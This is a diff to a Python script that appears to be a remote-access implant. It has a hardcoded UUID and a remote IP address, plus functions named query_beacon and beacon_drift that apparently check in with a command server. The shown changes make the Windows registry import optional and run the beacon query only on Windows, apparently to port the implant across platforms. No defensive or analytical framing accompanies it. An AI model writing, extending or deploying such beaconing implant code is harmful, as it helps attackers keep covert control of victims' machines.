@@ -1,13 +1,17 @@
 #!/usr/bin/python3
 import socket, platform, ssl, subprocess
 from printlib import *
+import importlib
 from time import time, sleep
 from os import remove, path, getpid, kill, getlogin
 from datetime import datetime
-from sys import exit
+from sys import exit, builtin_module_names
 from signal import SIGTERM
 from random import randint, uniform
-import winreg
+
+winreg_exists = importlib.find_loader('winreg')
+if winreg_exists:
+    import winreg
 
 UUID = "ea4iFScQxHoScYMnztWhFyhVNOe5oZgeT"
 remote_ip = '134.209.206.142'
@@ -310,7 +314,8 @@ def beacon_drift(value):
 
 def main ():
     global BEACON_INTERVAL_SETTING
-    query_beacon()
+    if 'nt' in builtin_module_names:
+        query_beacon()
 
     while True:
         try:
